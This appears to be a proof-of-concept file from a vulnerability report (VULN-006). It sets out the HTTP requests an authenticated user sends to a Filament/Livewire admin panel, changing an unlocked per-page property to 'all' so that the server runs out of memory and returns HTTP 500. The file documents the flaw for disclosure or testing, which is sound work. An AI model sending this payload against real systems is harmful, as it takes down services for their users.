### VULN-006 — decisive request. Full capture in response.txt / run.log.
### tableRecordsPerPage is a public (non-#[Locked]) Livewire property; the live
### getter returns it verbatim (no clamp), and 'all' becomes the full row count
### as the SQL LIMIT → the worker hydrates/renders the entire table and OOMs.

### 1) Obtain a valid snapshot (authenticated panel user)
GET /admin/posts HTTP/1.1
Host: localhost:21890
Cookie: filament-session=<session>

### 2) Re-render the table with perPage='all' on a large table → HTTP 500 (OOM)
POST /livewire/update HTTP/1.1
Host: localhost:21890
Content-Type: application/json
X-Livewire: true
X-CSRF-TOKEN: <csrf>

{
  "_token": "<csrf>",
  "components": [
    { "snapshot": "<list-posts snapshot>",
      "updates": { "tableRecordsPerPage": "all" },
      "calls": [] }
  ]
}

### Response: HTTP 500; app log shows
###   production.ERROR: Allowed memory size of 536870912 bytes exhausted
